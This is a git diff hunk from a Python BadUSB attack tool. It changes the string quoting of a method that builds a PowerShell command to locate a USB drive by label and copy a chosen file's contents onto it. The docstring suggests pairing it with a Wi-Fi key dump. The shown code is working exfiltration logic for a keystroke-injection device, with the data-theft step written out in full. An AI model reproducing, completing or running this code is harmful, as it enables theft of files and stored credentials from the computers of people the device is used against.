@@ -685,7 +685,7 @@ class BadUSB:
             put command if you want to do a special command like netsh wlan key show (or however it goes)
             """
 
-        fullCmd = 'powershell "$m=(Get-Volume -FileSystemLabel \'{}\'). DriveLetter; type {}>>$m\':\{}\'"'.format(exfilVolumeName, filename, exfilFileName)
+        fullCmd = r'powershell "$m=(Get-Volume -FileSystemLabel \'{}\'). DriveLetter; type {}>>$m\':\{}\'"'.format(exfilVolumeName, filename, exfilFileName)
 
         return self.run(fullCmd)
     
